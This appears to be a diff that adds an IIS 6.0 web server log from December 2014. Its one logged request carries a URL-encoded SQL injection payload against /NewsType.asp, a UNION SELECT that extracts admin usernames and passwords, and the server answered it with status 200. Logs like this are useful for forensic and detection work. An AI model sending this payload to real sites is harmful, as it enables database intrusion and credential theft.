@@ -1,0 +1,5 @@
+#Software: Microsoft Internet Information Services 6.0
+#Version: 1.0
+#Date: 2014-12-08 03:23:34
+#Fields: date time s-sitename s-computername s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs-version cs(User-Agent) cs(Cookie) cs(Referer) cs-host sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken 
+2014-12-08 03:23:34 W3SVC701445906 CHINESE-43AF4F3 220.168.248.200 GET /NewsType.asp SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''=' 80 - 115.229.25.127 HTTP/1.1 - - - www.178898.com 200 0 64 0 234 500
